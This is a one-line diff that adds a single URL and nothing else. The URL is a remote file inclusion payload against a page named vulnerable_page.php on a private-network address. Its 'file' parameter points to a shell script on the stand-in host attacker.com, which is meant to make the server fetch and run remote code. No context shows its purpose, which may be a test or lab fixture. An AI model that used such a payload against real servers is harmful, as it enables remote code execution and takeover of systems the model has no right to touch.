@@ -1,0 +1,1 @@
+http://192.168.110.140/vulnerable_page.php?file=http://attacker.com/shell.txt
